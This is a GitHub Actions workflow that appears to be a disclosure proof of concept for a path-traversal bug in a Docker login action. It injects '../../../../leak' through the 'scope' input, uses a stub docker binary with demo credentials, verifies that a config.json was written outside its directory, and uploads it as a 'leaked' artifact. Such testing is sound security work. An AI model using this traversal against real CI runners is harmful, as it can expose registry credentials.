name: poc-scope-traversal
on:
  workflow_dispatch:
    inputs:
      scope:
        description: "Traversal payload"
        required: true
        default: "../../../../leak"

jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6

      - name: Install fake docker (safe deterministic test)
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p "$RUNNER_TEMP/bin"
          cat > "$RUNNER_TEMP/bin/docker" <<'EOF'
          #!/usr/bin/env bash
          set -euo pipefail
          cmd="$1"; shift || true
          echo "cmd=$cmd DOCKER_CONFIG=${DOCKER_CONFIG:-} args=$*" >> "$RUNNER_TEMP/docker-invocations.log"

          if [ "$cmd" = "login" ]; then
            cat >/dev/null || true
            mkdir -p "${DOCKER_CONFIG}"
            echo '{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}' > "${DOCKER_CONFIG}/config.json"
            exit 0
          fi

          if [ "$cmd" = "logout" ]; then
            exit 0
          fi

          exit 0
          EOF
          chmod +x "$RUNNER_TEMP/bin/docker"
          echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"

      - name: Run vulnerable login action
        uses: ./
        with:
          username: demo
          password: demo
          scope: ${{ inputs.scope }}
          logout: false

      - name: Verify escaped write
        id: verify
        shell: bash
        run: |
          set -euo pipefail
          echo "RUNNER_TEMP=$RUNNER_TEMP"
          echo "HOME=$HOME"
          echo "---- docker invocation log ----"
          cat "$RUNNER_TEMP/docker-invocations.log"

          CFG="$(sed -n 's/.*DOCKER_CONFIG=\(.*\) args=.*/\1/p' "$RUNNER_TEMP/docker-invocations.log" | tail -n1)"
          echo "Resolved DOCKER_CONFIG: $CFG"

          test -n "$CFG"
          test -f "$CFG/config.json"

          echo "FOUND escaped config at $CFG/config.json"
          cat "$CFG/config.json"

          echo "cfg=$CFG" >> "$GITHUB_OUTPUT"

      - name: Upload leaked file (exploit chain proof)
        uses: actions/upload-artifact@v4
        with:
          name: leaked-docker-config
          path: ${{ steps.verify.outputs.cfg }}/config.json
          if-no-files-found: error

